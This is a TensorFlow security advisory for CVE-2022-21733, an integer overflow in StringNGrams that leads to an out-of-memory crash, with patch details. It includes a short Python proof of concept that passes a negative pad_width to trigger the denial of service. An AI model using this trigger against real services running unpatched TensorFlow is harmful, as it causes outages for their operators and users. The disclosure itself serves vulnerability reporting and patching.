<h2>TFSA-2022-009: OOM due to integer overflow in <code>StringNGrams</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-21733</p>
<h3>Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/string_ngrams_op.cc#L29-L161">implementation of <code>StringNGrams</code></a> can be used to trigger a denial of service attack by causing an OOM condition after an integer overflow:</p>
<p>```python
import tensorflow as tf</p>
<p>tf.raw_ops.StringNGrams(
  data=['123456'],
  data_splits=[0,1],
  separator='a'*15,
  ngram_widths=[],
  left_pad='',
  right_pad='',
  pad_width=-5,
  preserve_short_sequences=True)
```</p>
<p>We are missing a validation on <code>pad_witdh</code> and that result in computing a negative value for <code>ngram_width</code> which is later used to allocate parts of the output.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f68fdab93fb7f4ddb4eb438c8fe052753c9413e8">f68fdab93fb7f4ddb4eb438c8fe052753c9413e8</a>.</p>
<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
